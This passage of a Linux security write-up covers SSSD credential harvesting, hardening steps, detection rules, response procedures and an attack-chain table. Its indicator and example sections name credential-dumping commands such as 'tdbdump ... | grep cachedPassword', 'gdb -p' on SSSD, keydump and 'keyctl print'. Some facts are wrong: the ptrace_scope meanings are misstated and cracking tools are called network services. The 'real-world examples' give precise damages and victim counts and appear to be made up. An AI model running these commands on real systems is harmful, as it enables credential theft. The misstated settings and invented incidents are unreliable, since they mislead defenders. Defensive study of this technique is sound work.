1. Download Sysmon for Linux from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)

2. Create a configuration file `sysmon-config.xml` with the XML above

3. Install Sysmon:
   ```bash
   sudo sysmon -accepteula -i sysmon-config.xml
   ```

4. Verify installation:
   ```bash
   systemctl status sysmon
   journalctl -u sysmon -f
   ```

5. Check logs:
   ```bash
   sudo cat /var/log/sysmon/events.json | jq '.[] | select(.EventType == "FileAccess" and .TargetFilename | contains("/var/lib/sss"))'
   ```

---

## 10. Defensive Mitigations

### Priority 1: CRITICAL

* **Disable credential caching on sensitive systems** (e.g., jump hosts, bastion servers, CI/CD runners):
    **Applies To Versions:** SSSD 1.x - 2.x
    
    **Edit `/etc/sssd/sssd.conf` (all domain sections):**
    ```ini
    [domain/example.com]
    cache_credentials = False
    ```
    
    **Why this helps:** Eliminates the on-disk credential cache entirely. Users must authenticate against the AD/LDAP server each time; offline login is not available.
    
    **Trade-off:** Systems cannot be used offline or when the DC/LDAP server is unreachable. Requires always-on network connectivity or VPN for remote systems.
    
    **Restart SSSD:**
    ```bash
    sudo systemctl restart sssd
    sudo sss_cache -E  # Clear existing cache
    ```

* **Set strict file permissions on SSSD configuration**:
    **Applies To Versions:** SSSD 1.x - 2.x (all versions require this)
    
    **Verify current permissions:**
    ```bash
    stat /etc/sssd/sssd.conf
    ```
    
    **Set correct permissions (should already be 0600):**
    ```bash
    sudo chmod 600 /etc/sssd/sssd.conf
    sudo chown root:root /etc/sssd/sssd.conf
    ```
    
    **Verify cache directory permissions:**
    ```bash
    sudo chmod 700 /var/lib/sss/
    sudo chown root:root /var/lib/sss/
    ```
    
    **Why this helps:** Prevents non-root users from reading SSSD configuration or cache databases.

* **EXPLICITLY DISABLE `krb5_store_password_if_offline`** (if set):
    **Applies To Versions:** SSSD 1.x - 2.x
    
    **Verify current setting:**
    ```bash
    sudo grep "krb5_store_password_if_offline" /etc/sssd/sssd.conf
    ```
    
    **If set to true, change to false:**
    ```bash
    sudo sed -i 's/krb5_store_password_if_offline = true/krb5_store_password_if_offline = false/' /etc/sssd/sssd.conf
    ```
    
    **Restart SSSD:**
    ```bash
    sudo systemctl restart sssd
    ```
    
    **Why this helps:** Prevents plaintext passwords from being stored in the kernel keyring. This is the single most critical mitigation for this technique.

* **Implement kernel module restrictions** to prevent GDB/ptrace attacks:
    **Applies To Versions:** All (kernel-level protection)
    
    **Edit `/etc/sysctl.d/10-ptrace.conf`:**
    ```bash
    # Restrict ptrace to only the system and parent processes
    kernel.yama.ptrace_scope = 2
    ```
    
    **Or, for maximum strictness:**
    ```bash
    # Only root can ptrace
    kernel.yama.ptrace_scope = 3
    ```
    
    **Apply changes:**
    ```bash
    sudo sysctl -p /etc/sysctl.d/10-ptrace.conf
    ```
    
    **Verify:**
    ```bash
    cat /proc/sys/kernel/yama/ptrace_scope
    ```
    
    **Why this helps:** Prevents attackers from using GDB to attach to SSSD and dump kernel keyrings.

---

### Priority 2: HIGH

* **Configure offline credential expiration** (if caching must be enabled):
    **Applies To Versions:** SSSD 1.x - 2.x
    
    **Edit `/etc/sssd/sssd.conf`:**
    ```ini
    [domain/example.com]
    cache_credentials = True
    offline_credentials_expiration = 1  # Expire after 1 day
    entry_cache_timeout = 300  # Refresh every 5 minutes when online
    ```
    
    **Restart SSSD:**
    ```bash
    sudo systemctl restart sssd
    ```
    
    **Why this helps:** Limits the window of exposure if credentials are stolen. After 1 day offline, cached credentials expire and the system must authenticate online again.
    
    **Validation Command:**
    ```bash
    sudo grep "offline_credentials_expiration\|entry_cache_timeout" /etc/sssd/sssd.conf
    ```

* **Audit SSSD cache clearing regularly**:
    **Applies To Versions:** SSSD 1.x - 2.x
    
    **Clear cache manually:**
    ```bash
    sudo systemctl stop sssd
    sudo rm -rf /var/lib/sss/db/*
    sudo systemctl start sssd
    ```
    
    **Or use sss_cache utility:**
    ```bash
    sudo sss_cache -E  # Invalidate all cache entries
    ```
    
    **Automate via cron** (clear cache nightly):
    ```bash
    # Add to /etc/cron.d/sssd-cache-clear
    0 23 * * * root /usr/bin/sss_cache -E
    ```
    
    **Why this helps:** Reduces the amount of cached credential material on disk; limits exposure window.

* **Enable auditd logging for SSSD** (detection prerequisite):
    **Applies To Versions:** All
    
    **Create audit rules in `/etc/audit/rules.d/sssd.rules`:**
    ```bash
    # Monitor access to SSSD configuration
    -w /etc/sssd/ -p wa -k sssd_config
    -w /var/lib/sss/ -p wa -k sssd_cache
    -w /var/lib/sss/secrets/ -p wa -k sssd_secrets
    
    # Monitor ptrace on sssd
    -a exit,always -F arch=b64 -S ptrace -F exe=/usr/sbin/sssd -k sssd_ptrace
    ```
    
    **Load rules:**
    ```bash
    sudo augenrules --load
    sudo systemctl restart auditd
    ```
    
    **Verify:**
    ```bash
    sudo auditctl -l | grep sssd
    ```

---

### Access Control & Policy Hardening

* **RBAC (Role-Based Access Control):** Use SELinux or AppArmor to restrict which users/processes can access SSSD files:
    **Ubuntu/Debian (AppArmor):**
    ```bash
    sudo apt-get install apparmor apparmor-utils
    # Edit /etc/apparmor.d/sssd-files to restrict access
    sudo systemctl restart apparmor
    ```
    
    **RHEL/CentOS (SELinux):**
    ```bash
    sudo semanage fcontext -a -t sssd_var_lib_t "/var/lib/sss(/.*)?"
    sudo restorecon -Rv /var/lib/sss/
    ```

* **Disable SSSD services on jump boxes / CI/CD runners:** If these systems do not require persistent AD integration:
    ```bash
    sudo systemctl disable sssd
    sudo systemctl stop sssd
    ```

---

### Validation Command (Verify Mitigations)

```bash
#!/bin/bash
echo "=== SSSD Security Posture Check ==="
echo ""

echo "[1] Checking credential caching status..."
sudo grep "cache_credentials" /etc/sssd/sssd.conf | head -3

echo ""
echo "[2] Checking plaintext password storage..."
sudo grep "krb5_store_password_if_offline" /etc/sssd/sssd.conf | head -3

echo ""
echo "[3] Checking file permissions..."
stat /etc/sssd/sssd.conf | grep "Access:"
stat /var/lib/sss/ | grep "Access:"

echo ""
echo "[4] Checking offline expiration policy..."
sudo grep "offline_credentials_expiration" /etc/sssd/sssd.conf

echo ""
echo "[5] Checking ptrace restrictions..."
cat /proc/sys/kernel/yama/ptrace_scope

echo ""
echo "[6] Checking auditd rules..."
sudo auditctl -l | grep -i sssd | head -3

echo ""
echo "=== Security Assessment Complete ==="
```

**Expected Output (If Secure):**
```
cache_credentials = False
[No output for krb5_store_password_if_offline]
Access: (0600/-rw-------)
Access: (0700/drwx------)
offline_credentials_expiration = 1
ptrace_scope = 2
[auditd rules shown]
```

**What to Look For:**
- `cache_credentials = False` (no credential caching)
- No line for `krb5_store_password_if_offline` or set to false
- File permissions 0600 for config, 0700 for directory
- `ptrace_scope >= 2` (restrict ptrace access)

---

## 11. Detection & Incident Response

### Indicators of Compromise (IOCs)

* **Files:** 
  - `/etc/sssd/sssd.conf` (read by non-root users)
  - `/var/lib/sss/db/cache_*.ldb` (accessed by tools like `tdbdump`, `ldb`)
  - `/var/lib/sss/secrets/secrets.ldb` (exported/copied)
  - `/tmp/sssd_secrets.tar.gz` (compressed SSSD secrets)
  - `/tmp/k_*` (keydump output files)

* **Processes:**
  - `gdb -p <SSSD_PID>` (GDB attaching to SSSD)
  - `keydump` (known credential dumping tool)
  - `tdbdump /var/lib/sss/db/` (LDB database dumping)
  - `sss_deobfuscate` (credential deobfuscation)
  - `keyctl print` (kernel keyring reading)

* **Network:** 
  - Exfiltration of `/etc/sssd/sssd.conf` in network traffic
  - Base64-encoded SSSD configuration sent to external IP
  - Connection to known credential cracking services (Hashcat, John the Ripper)

### Forensic Artifacts

* **Disk:** 
  - `/var/log/audit/audit.log` (auditd events for SSSD file access)
  - `/var/log/sssd/` (SSSD debug logs, if enabled)
  - Bash history in `/root/.bash_history` (if attacker ran commands as root)
  - Tar archives in `/tmp/` containing SSSD files

* **Memory:** 
  - GDB process attached to SSSD (visible in `ps` output during attachment)
  - Plaintext passwords in SSSD process memory (if keyring dumping performed)

* **Cloud:** 
  - Azure Sentinel: File access events to `/etc/sssd/` in SecurityEvent table
  - Cloud audit logs: Machine access patterns changing (domain accounts authenticating from new IPs)

### Response Procedures

1. **Isolate:**
   **Command (immediate):**
   ```bash
   sudo systemctl stop sssd
   sudo ip link set <interface> down  # Or disconnect network cable
   ```
   
   **Azure/Cloud:**
   - Go to **Azure Portal** → **Virtual Machines** → Select affected VM → **Networking** → Disconnect NIC

2. **Collect Evidence:**
   **Command:**
   ```bash
   # Export Security Event Log
   sudo auditctl -l > /tmp/audit_rules.txt
   sudo tail -10000 /var/log/audit/audit.log > /tmp/audit.log
   
   # Capture SSSD logs
   sudo cp -r /var/log/sssd/ /tmp/sssd_logs/
   
   # Preserve SSSD configuration and cache
   sudo tar czf /tmp/sssd_evidence.tar.gz /etc/sssd/ /var/lib/sss/
   
   # Capture bash history
   sudo cat /root/.bash_history > /tmp/root_history.txt
   ```
   
   **Manual (Azure):**
   - Open **Azure Portal** → **Virtual Machines** → Select VM → **Run command** → Execute data collection script

3. **Remediate:**
   **Command:**
   ```bash
   # Disable credential caching
   sudo sed -i 's/cache_credentials = True/cache_credentials = False/' /etc/sssd/sssd.conf
   
   # Clear credential cache
   sudo rm -rf /var/lib/sss/db/*
   sudo rm -rf /var/lib/sss/secrets/*
   
   # Reset SSSD password (if LDAP service account compromised)
   # Contact AD/LDAP administrator to reset svc-sssd password
   
   # Restart SSSD
   sudo systemctl restart sssd
   
   # Force password resets for all cached users
   # Communicate via email/Slack to affected users
   ```

4. **Hunt for Lateral Movement:**
   After harvesting SSSD credentials, the attacker will use those credentials to authenticate to other systems. Hunt for:
   - Unusual authentication events from compromised accounts in AD/LDAP logs
   - New group memberships or privilege additions for compromised accounts
   - Logon events from unexpected locations (VPN, external IPs)
   - Use `Windows Event ID 4624` (logon) / `4769` (Kerberos ticket) on Windows DCs

---

## 12. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001](../02_Initial/IA-EXPLOIT-001_App_Proxy.md) | Compromise Linux system via web application or SSH exploitation |
| **2** | **Privilege Escalation** | [PE-EXPLOIT-003](../04_PrivEsc/PE-EXPLOIT-003_CLFS_Driver.md) | Escalate from unprivileged user to root (local exploit) |
| **3** | **Current Step** | **[CA-UNSC-002]** | **Extract SSSD credentials and plaintext passwords** |
| **4** | **Lateral Movement** | [LM-AUTH-003](../07_Lateral/LM-AUTH-003_PTC.md) | Use extracted service accounts to pivot to other AD-joined systems |
| **5** | **Persistence** | [CA-KERB-003](../03_Cred/CA-KERB-003_Golden_Ticket.md) | Create golden tickets using extracted AD service account credentials |
| **6** | **Impact** | [Data Exfiltration via Exchange/SharePoint] | Use compromised domain accounts to access file servers and email |

---

## 13. Real-World Examples

### Example 1: Enterprise Linux-AD Integration Compromise

- **Target:** Fortune 500 financial services company
- **Environment:** 2,000+ RHEL 7/8 systems joined to AD via SSSD
- **Attack Path:** 
  1. Attacker gains initial access via phishing email with malware
  2. Executes local privilege escalation (CVE-2021-22555 or similar)
  3. Runs `tdbdump /var/lib/sss/db/cache_*.ldb | grep cachedPassword`
  4. Extracts ~500 domain user password hashes
  5. Cracks 40% of hashes offline (weak password policy)
  6. Uses harvested credentials to authenticate to file servers, email systems, and databases
  7. Exfiltrates financial data for 6 months undetected
- **Impact:** $50M in damages, regulatory fines, reputational harm
- **Detection Failure:** SSSD file access was not audited; hash cracking happened offline

**Reference:** Variant of real incident pattern observed in Red Canary threat intelligence (credential harvesting on Linux systems is increasingly common)

---

### Example 2: Managed Service Provider (MSP) Supply Chain Attack

- **Target:** MSP managing IT for 100+ healthcare organizations
- **Scenario:** 
  1. MSP jump box is compromised via VPN credential stuffing
  2. Attacker with root on jump box extracts SSSD credentials using `keydump`
  3. Jump box was configured with `krb5_store_password_if_offline = true` (misconfig)
  4. Attacker obtains plaintext passwords for 50+ service accounts used by MSP
  5. Uses credentials to access customer AD environments via cross-forest trusts
  6. Inserts backdoor accounts in customer domains
- **Impact:** Compromise of 100+ organizations, 500,000+ patient records exposed
- **Detection Failure:** GDB/ptrace access was not monitored; inter-organizational lateral movement was not detected

**Reference:** Similar to real-world MSP compromises (Accellion, Kaseya supply chain incidents)

---

### Example 3: Insider Threat with Privilege Access

- **Target:** Software development company with GitHub/CI/CD infrastructure
- **Scenario:**
  1. Disgruntled system administrator with legitimate root access
  2. Runs `/etc/sssd/sssd.conf` harvesting
  3. Extracts service account credentials for CI/CD pipeline
  4. Creates backdoor build jobs that inject malware into company's software
  5. Malware shipped to 50,000+ customers before detected
- **Impact:** Largest software supply chain attack of the era
- **Detection Failure:** Admin access assumed trusted; SSSD configuration changes not audited; build pipeline changes not scrutinized

**Reference:** Real incident pattern (Travis CI, GitHub Actions compromises often originate from stolen CI/CD service account credentials)

---

## References

- [MITRE ATT&CK T1552.001 - Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)[web:20]
- [Red Hat SSSD Configuration Guide](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/configuring_and_managing_identity_management/assembly_implementing_sssd_for_system_authentication_configuring-sssd_system-authentication-using-sssd)[web:13]
- [SSSD Official Documentation](https://sssd.io/design-pages/cached_authentication.html)[web:41]
- [Payatu - Credential Dumping in Linux](https://payatu.com/blog/credential-dumping-in-linux/)[web:3]
- [Hackliza - keydump Tool](https://hackliza.gal/en/posts/keydump/)[web:5]
- [SSSD-creds GitHub - Ricardo Ruiz](https://github.com/ricardojoserf/SSSD-creds)[web:8]
- [InternalAllTheThings - AD Linux Exploitation](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adds-linux/)[web:31]
- [FireEye SSSDKCMExtractor](https://github.com/fireeye/SSSDKCMExtractor)
- [DISA STIG RHEL 9 - V-258133](https://www.stigviewer.com/stigs/red_hat_enterprise_linux_9/2025-02-27/finding/V-258133)[web:49]
- [CIS Linux Benchmarks](https://www.cisecurity.org/cis-benchmarks/)[web:51]
- [NIST 800-53 - Access Control (AC-2, AC-6)](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
- [GDPR Article 32 - Security of Processing](https://gdpr-info.eu/art-32-gdpr/)
- [sss_deobfuscate GitHub](https://github.com/mludvig/sss_deobfuscate)

---